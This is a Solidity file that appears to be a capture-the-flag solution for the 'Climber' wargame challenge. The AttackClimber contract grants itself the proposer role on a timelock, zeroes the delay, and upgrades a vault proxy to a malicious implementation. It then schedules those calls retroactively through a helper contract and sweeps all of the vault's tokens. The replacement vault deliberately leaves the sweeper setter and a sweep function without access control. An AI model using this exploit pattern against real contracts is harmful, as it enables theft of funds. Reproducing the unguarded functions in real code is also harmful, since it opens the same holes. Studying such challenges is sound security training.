// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/console.sol";

import {ClimberTimelock} from "../climber/ClimberTimelock.sol";
import {ClimberVault} from "../climber/ClimberVault.sol";
import {PROPOSER_ROLE} from "../climber/ClimberConstants.sol";

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "../climber/ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "../climber/ClimberErrors.sol";

import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract AttackClimber {
    ClimberTimelock private climberTimelock;
    ClimberVault private proxy;
    address private token;
    address private recovery;

    constructor(address _climberTimelock, address _climberVault, address _token, address _recovery) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
        proxy = ClimberVault(_climberVault);
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = "";

        HelperContract helperContract = new HelperContract(address(climberTimelock));

        // 1. Grant the proposer role
        targets[0] = address(climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(helperContract)));

        // 2. Set the delay to 0
        targets[1] = address(climberTimelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // 3. Upgrade the ClimberVault
        ClimberVaultV2 climberVaultV2 = new ClimberVaultV2();
        targets[2] = address(proxy);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(climberVaultV2), ""));

        // 4. Schedule the attack
        targets[3] = address(helperContract);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(HelperContract.callSchedule, ());

        // 5. Set the data in the helper contract
        helperContract.setData(targets, values, dataElements, salt);

        // 6. Execute attack
        climberTimelock.execute(targets, values, dataElements, salt);

        // 7. Set the sweeper to sweep the funds and transfer them to the recovery address
        ClimberVaultV2(address(proxy))._setSweeper(address(this));
        ClimberVaultV2(address(proxy)).sweepFunds(token);
        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract HelperContract {
    ClimberTimelock private climberTimelock;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(address _climberTimelock) {
        climberTimelock = ClimberTimelock(payable(_climberTimelock));
    }

    function callSchedule() external {
        climberTimelock.schedule(targets, values, dataElements, salt);
    }

    function setData(
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) external {
        for (uint256 i = 0; i < _targets.length; ++i) {
            targets.push(_targets[i]);
            values.push(_values[i]);
            dataElements.push(_dataElements[i]);
        }
        salt = _salt;
    }
}

contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function sweepFunds2(address token, address _sweeperAddress, address proxy) external {
        console.log("Pozvalo se2, %s", _sweeperAddress);
        SafeTransferLib.safeTransfer(token, _sweeperAddress, IERC20(token).balanceOf(proxy));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) public {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
